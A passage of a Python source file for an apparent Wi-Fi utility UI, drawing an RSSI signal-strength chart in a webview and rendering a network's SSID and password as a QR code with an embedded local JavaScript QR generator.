                '<div class="row">max <b>' + str(rssi_max) + ' dBm</b></div>'
                '<div class="row">avg <b>' + str(round(rssi_avg, 1))
                + ' dBm</b></div>'
                '<div class="row">n = <b>' + str(len(samples)) + '</b></div>'
                '</div>'
                '<script>'
                'var P = ' + points_json + ';'
                'var c = document.getElementById("c");'
                'var ctx = c.getContext("2d");'
                'var W, H;'
                'function resize(){'
                '  var dpr = window.devicePixelRatio || 1;'
                '  W = window.innerWidth; H = window.innerHeight;'
                '  if (W < 10 || H < 10) { W = 360; H = 420; }'
                '  c.width = W * dpr; c.height = H * dpr;'
                '  c.style.width = W + "px"; c.style.height = H + "px";'
                '  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);'
                '}'
                'function draw(){'
                '  ctx.clearRect(0, 0, W, H);'
                '  var padL = 40, padR = 20, padT = 30, padB = 40;'
                '  var plotW = W - padL - padR;'
                '  var plotH = H - padT - padB;'
                '  if (P.length === 0) { return; }'
                '  var maxT = 1;'
                '  for (var i = 0; i < P.length; i++) '
                '    if (P[i][0] > maxT) maxT = P[i][0];'
                '  var rmin = -100, rmax = -20;'
                '  ctx.strokeStyle = "rgba(212,180,255,0.15)";'
                '  ctx.lineWidth = 1;'
                '  for (var g = 0; g <= 4; g++) {'
                '    var y = padT + plotH * g / 4;'
                '    ctx.beginPath();'
                '    ctx.moveTo(padL, y);'
                '    ctx.lineTo(W - padR, y);'
                '    ctx.stroke();'
                '    var lvl = rmax - (rmax - rmin) * g / 4;'
                '    ctx.fillStyle = "#a89bc4";'
                '    ctx.font = "11px monospace";'
                '    ctx.fillText(Math.round(lvl) + "", 6, y + 4);'
                '  }'
                '  ctx.beginPath();'
                '  ctx.lineWidth = 2;'
                '  ctx.strokeStyle = "#b088ff";'
                '  for (var i = 0; i < P.length; i++) {'
                '    var x = padL + plotW * (maxT > 0 ? P[i][0] / maxT : 0);'
                '    var r = P[i][1];'
                '    if (r < rmin) r = rmin;'
                '    if (r > rmax) r = rmax;'
                '    var y = padT + plotH * (rmax - r) / (rmax - rmin);'
                '    if (i === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);'
                '  }'
                '  ctx.stroke();'
                '  ctx.fillStyle = "rgba(176,136,255,0.15)";'
                '  ctx.beginPath();'
                '  ctx.moveTo(padL, padT + plotH);'
                '  for (var i = 0; i < P.length; i++) {'
                '    var x = padL + plotW * (maxT > 0 ? P[i][0] / maxT : 0);'
                '    var r = P[i][1];'
                '    if (r < rmin) r = rmin;'
                '    if (r > rmax) r = rmax;'
                '    var y = padT + plotH * (rmax - r) / (rmax - rmin);'
                '    ctx.lineTo(x, y);'
                '  }'
                '  ctx.lineTo(W - padR, padT + plotH);'
                '  ctx.closePath();'
                '  ctx.fill();'
                '  ctx.fillStyle = "#8f82a8";'
                '  ctx.font = "11px monospace";'
                '  ctx.fillText("time (s)", W - padR - 60, H - 10);'
                '}'
                'window.addEventListener("resize", function(){'
                '  resize();'
                '  draw();'
                '});'
                'resize();'
                'draw();'
                '</script></body></html>'
            )

        children = [
            ui.card([
                ui.text("📈  RSSI", "labelSmall", color="secondary"),
                ui.text(ssid, "titleMedium"),
                ui.text("Refresh every 2 s · up to {} points".format(
                    self.MAX_RSSI_SAMPLES), "bodySmall", color="secondary"),
                ui.row([
                    self._button(ui, "🗑  Clear",
                                 self._clear_rssi_samples,
                                 enabled=not self._busy),
                    self._button(ui, "↻  Refresh",
                                 lambda: self._refresh(force=True),
                                 style="text"),
                ]),
            ]),
        ]

        try:
            children.append(ui.card([
                ui.webview(html=html, height=520, fill_max_size=False),
            ], padding=4))
        except Exception as exc:
            self._log("error", "graph webview: " + str(exc)[:200])
            children.append(ui.card([
                ui.text("Chart unavailable", "bodyMedium", color="error"),
            ]))

        children.append(self._bottom_nav(ui))
        return children

    def _clear_rssi_samples(self):
        with self._rssi_lock:
            self._rssi_samples = []
        self._toast("Chart cleared")

    def _qr_ui(self, ui):
        if not self._found_password:
            children = [
                ui.button("←  Home", self._bind(self._go, "main"),
                          style="filled"),
                ui.card([
                    ui.text("🔳  QR", "labelSmall", color="secondary"),
                    ui.text("A password is needed first", "bodyMedium",
                            color="secondary"),
                    self._button(ui, "🏠  To overview", self._go, "main",
                                 style="filled"),
                ]),
                self._bottom_nav(ui),
            ]
            return children

        ssid = self._text(self._network.get("ssid", ""))
        pw = self._found_password
        wifi_str = "WIFI:S:{};T:WPA;P:{};;".format(ssid, pw)

        def esc(s):
            return (str(s).replace("&", "&amp;").replace("<", "&lt;")
                    .replace(">", "&gt;").replace('"', "&quot;"))

        # Local QR generator in JS (no external APIs)
        qr_js = """
        var qrcode = function () {
            var qrcode = function (typeNumber, errorCorrectionLevel) {
                var PAD0 = 0xEC, PAD1 = 0x11;
                var _typeNumber = typeNumber;
                var _errorCorrectionLevel = QRErrorCorrectionLevel[errorCorrectionLevel];
                var _modules = null, _moduleCount = 0, _dataCache = null, _dataList = [];
                var _this = {};
                var makeImpl = function (test, maskPattern) {
                    _moduleCount = _typeNumber * 4 + 17;
                    _modules = function (moduleCount) {
                        var modules = new Array(moduleCount);
                        for (var row = 0; row < moduleCount; row += 1) {
                            modules[row] = new Array(moduleCount);
                            for (var col = 0; col < moduleCount; col += 1) modules[row][col] = null;
                        }
                        return modules;
                    }(_moduleCount);
                    setupPositionProbePattern(0, 0);
                    setupPositionProbePattern(_moduleCount - 7, 0);
                    setupPositionProbePattern(0, _moduleCount - 7);
                    setupPositionAdjustPattern();
                    setupTimingPattern();
                    setupTypeInfo(test, maskPattern);
                    if (_typeNumber >= 7) setupTypeNumber(test);
                    if (_dataCache == null) _dataCache = createData(_typeNumber, _errorCorrectionLevel, _dataList);
                    mapData(_dataCache, maskPattern);
                };
                var setupPositionProbePattern = function (row, col) {
                    for (var r = -1; r <= 7; r += 1) {
                        if (row + r <= -1 || _moduleCount <= row + r) continue;
                        for (var c = -1; c <= 7; c += 1) {
                            if (col + c <= -1 || _moduleCount <= col + c) continue;
                            if ((0 <= r && r <= 6 && (c == 0 || c == 6)) || (0 <= c && c <= 6 && (r == 0 || r == 6)) || (2 <= r && r <= 4 && 2 <= c && c <= 4)) _modules[row + r][col + c] = true;
                            else _modules[row + r][col + c] = false;
                        }
                    }
                };
                var getBestMaskPattern = function () {
                    var minLostPoint = 0, pattern = 0;
                    for (var i = 0; i < 8; i += 1) {
                        makeImpl(true, i);
                        var lostPoint = QRUtil.getLostPoint(_this);
                        if (i == 0 || minLostPoint > lostPoint) { minLostPoint = lostPoint; pattern = i; }
                    }
                    return pattern;
                };
                var setupTimingPattern = function () {
                    for (var r = 8; r < _moduleCount - 8; r += 1) if (_modules[r][6] != null) continue; else _modules[r][6] = (r % 2 == 0);
                    for (var c = 8; c < _moduleCount - 8; c += 1) if (_modules[6][c] != null) continue; else _modules[6][c] = (c % 2 == 0);
                };
                var setupPositionAdjustPattern = function () {
                    var pos = QRUtil.getPatternPosition(_typeNumber);
                    for (var i = 0; i < pos.length; i += 1) {
                        for (var j = 0; j < pos.length; j += 1) {
                            var row = pos[i], col = pos[j];
                            if (_modules[row][col] != null) continue;
                            for (var r = -2; r <= 2; r += 1) {
                                for (var c = -2; c <= 2; c += 1) {
                                    if (r == -2 || r == 2 || c == -2 || c == 2 || (r == 0 && c == 0)) _modules[row + r][col + c] = true;
                                    else _modules[row + r][col + c] = false;
                                }
                            }
                        }
                    }
                };
                var setupTypeNumber = function (test) {
                    var bits = QRUtil.getBCHTypeNumber(_typeNumber);
                    for (var i = 0; i < 18; i += 1) {
                        var mod = (!test && ((bits >> i) & 1) == 1);
                        _modules[Math.floor(i / 3)][i % 3 + _moduleCount - 8 - 3] = mod;
                    }
                    for (var i = 0; i < 18; i += 1) {
                        var mod = (!test && ((bits >> i) & 1) == 1);
                        _modules[i % 3 + _moduleCount - 8 - 3][Math.floor(i / 3)] = mod;
                    }
                };
                var setupTypeInfo = function (test, maskPattern) {
                    var data = (_errorCorrectionLevel << 3) | maskPattern;
                    var bits = QRUtil.getBCHTypeInfo(data);
                    for (var i = 0; i < 15; i += 1) {
                        var mod = (!test && ((bits >> i) & 1) == 1);
                        if (i < 6) _modules[i][8] = mod;
                        else if (i < 8) _modules[i + 1][8] = mod;
                        else _modules[_moduleCount - 15 + i][8] = mod;
                    }
                    for (var i = 0; i < 15; i += 1) {
                        var mod = (!test && ((bits >> i) & 1) == 1);
                        if (i < 8) _modules[8][_moduleCount - i - 1] = mod;
                        else if (i < 9) _modules[8][15 - i - 1 + 1] = mod;
                        else _modules[8][15 - i - 1] = mod;
                    }
                    _modules[_moduleCount - 8][8] = (!test);
                };
                var mapData = function (data, maskPattern) {
                    var inc = -1, row = _moduleCount - 1, bitIndex = 7, byteIndex = 0;
                    var maskFunc = QRUtil.getMaskFunction(maskPattern);
                    for (var col = _moduleCount - 1; col > 0; col -= 2) {
                        if (col == 6) col -= 1;
                        while (true) {
                            for (var c = 0; c < 2; c += 1) {
                                if (_modules[row][col - c] == null) {
                                    var dark = false;
                                    if (byteIndex < data.length) dark = (((data[byteIndex] >>> bitIndex) & 1) == 1);
                                    var mask = maskFunc(row, col - c);
                                    if (mask) dark = !dark;
                                    _modules[row][col - c] = dark;
                                    bitIndex -= 1;
                                    if (bitIndex == -1) { byteIndex += 1; bitIndex = 7; }
                                }
                            }
                            row += inc;
                            if (row < 0 || _moduleCount <= row) { row -= inc; inc = -inc; break; }
                        }
                    }
                };
                var createData = function (typeNumber, errorCorrectionLevel, dataList) {
                    var rsBlocks = QRRSBlock.getRSBlocks(typeNumber, errorCorrectionLevel);
                    var buffer = new QRBitBuffer();
                    for (var i = 0; i < dataList.length; i += 1) {
                        var data = dataList[i];
                        buffer.put(data.getMode(), 4);
                        buffer.put(data.getLength(), QRUtil.getLengthInBits(data.getMode(), typeNumber));
                        data.write(buffer);
                    }
                    var totalDataCount = 0;
                    for (var i = 0; i < rsBlocks.length; i += 1) totalDataCount += rsBlocks[i].dataCount;
                    if (buffer.getLengthInBits() > totalDataCount * 8) throw new Error('code length overflow.');
                    if (buffer.getLengthInBits() + 4 <= totalDataCount * 8) buffer.put(0, 4);
                    while (buffer.getLengthInBits() % 8 != 0) buffer.putBit(false);
                    while (true) {
                        if (buffer.getLengthInBits() >= totalDataCount * 8) break;
                        buffer.put(PAD0, 8);
                        if (buffer.getLengthInBits() >= totalDataCount * 8) break;
                        buffer.put(PAD1, 8);
                    }
                    return createBytes(buffer, rsBlocks);
                };
                var createBytes = function (buffer, rsBlocks) {
                    var offset = 0, maxDcCount = 0, maxEcCount = 0;
                    var dcdata = new Array(rsBlocks.length);
                    var ecdata = new Array(rsBlocks.length);
                    for (var r = 0; r < rsBlocks.length; r += 1) {
                        var dcCount = rsBlocks[r].dataCount;
                        var ecCount = rsBlocks[r].totalCount - dcCount;
                        maxDcCount = Math.max(maxDcCount, dcCount);
                        maxEcCount = Math.max(maxEcCount, ecCount);
                        dcdata[r] = new Array(dcCount);
                        for (var i = 0; i < dcdata[r].length; i += 1) dcdata[r][i] = 0xff & buffer.buffer[i + offset];
                        offset += dcCount;
                        var rsPoly = QRUtil.getErrorCorrectPolynomial(ecCount);
                        var rawPoly = new QRPolynomial(dcdata[r], rsPoly.getLength() - 1);
                        var modPoly = rawPoly.mod(rsPoly);
                        ecdata[r] = new Array(rsPoly.getLength() - 1);
                        for (var i = 0; i < ecdata[r].length; i += 1) {
